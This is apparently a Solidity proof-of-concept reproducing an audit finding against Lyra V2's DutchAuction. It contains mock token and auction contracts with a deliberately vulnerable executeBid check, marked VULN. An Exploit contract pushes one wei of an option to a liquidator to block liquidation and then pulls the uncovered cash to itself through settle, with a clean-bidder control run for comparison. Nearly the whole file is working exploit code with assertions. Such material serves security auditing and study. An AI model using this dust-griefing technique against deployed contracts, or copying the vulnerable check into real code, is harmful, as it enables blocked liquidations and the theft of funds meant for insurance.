// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Lyra V2 — DutchAuction.executeBid reverts if the bidder holds any
    non-cash asset (Sigma Prime, LYRA-02). One wei of an option, pushed to
    the liquidator before the bid, blocks the liquidation. The shortfall is
    then paid out of the insurance cash. A bidder who holds only cash covers it. */

contract Cash26268 {
    string public name = "Insurance";
    string public symbol = "INS";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Option26268 {
    string public name = "Option";
    string public symbol = "OPT";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DutchAuction26268 {
    Cash26268 public cash;
    Option26268 public option;
    address public constant INSURANCE = 0x9999999999999999999999999999999999999999;
    uint256 public uncovered;

    constructor(Cash26268 c, Option26268 o) {
        cash = c;
        option = o;
    }

    function fund() external {
        uncovered = cash.balanceOf(address(this));
    }

    function executeBid(address bidder) external {
        // @> VULN: a bidder who holds any non-cash asset is rejected. One wei of option makes the liquidation revert.
        require(option.balanceOf(bidder) == 0, "non-cash");
        uint256 amt = cash.balanceOf(address(this));
        uncovered = 0;
        cash.transfer(INSURANCE, amt);
    }

    function settle(address borrower) external returns (uint256 paid) {
        require(uncovered > 0, "covered");
        paid = uncovered;
        uncovered = 0;
        cash.transfer(borrower, paid);
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;
    uint256 public constant DUST = 1;
    address public constant LIQUIDATOR = 0x2222222222222222222222222222222222222222;
    address public constant CLEAN = 0x3333333333333333333333333333333333333333;
    address public constant INSURANCE = 0x9999999999999999999999999999999999999999;

    Cash26268 public cash;
    Option26268 public option;
    DutchAuction26268 public auction;
    Cash26268 public cashC;
    DutchAuction26268 public auctionC;

    uint256 public funded;
    uint256 public dustOnBidder;
    bool public bidReverted;
    uint256 public shortfallBeforeSettle;
    uint256 public socialized;
    uint256 public insuranceGot;
    bool public controlBid;
    uint256 public controlInsurance;
    bool public controlSettleReverted;

    function run() external {
        cash = new Cash26268();
        option = new Option26268();
        auction = new DutchAuction26268(cash, option);
        cashC = new Cash26268();
        auctionC = new DutchAuction26268(cashC, option);

        cash.mint(address(auction), N);
        auction.fund();
        funded = auction.uncovered();

        option.mint(address(this), DUST);
        option.transfer(LIQUIDATOR, DUST);
        dustOnBidder = option.balanceOf(LIQUIDATOR);

        try auction.executeBid(LIQUIDATOR) {
            bidReverted = false;
        } catch {
            bidReverted = true;
        }
        shortfallBeforeSettle = auction.uncovered();
        socialized = auction.settle(address(this));
        insuranceGot = cash.balanceOf(INSURANCE);

        cashC.mint(address(auctionC), N);
        auctionC.fund();
        auctionC.executeBid(CLEAN);
        controlBid = true;
        controlInsurance = cashC.balanceOf(INSURANCE);
        try auctionC.settle(address(this)) {
            controlSettleReverted = false;
        } catch {
            controlSettleReverted = true;
        }

        require(funded == N, "funded");
        require(dustOnBidder == DUST, "dust");
        require(bidReverted, "bid");
        require(shortfallBeforeSettle == N, "shortfall");
        require(socialized == N, "socialized");
        require(insuranceGot == 0, "insurance");
        require(cash.balanceOf(address(this)) == N, "attacker");
        require(controlBid, "control bid");
        require(controlInsurance == N, "control insurance");
        require(controlSettleReverted, "control settle");
        require(cashC.balanceOf(address(this)) == 0, "control attacker");
    }
}
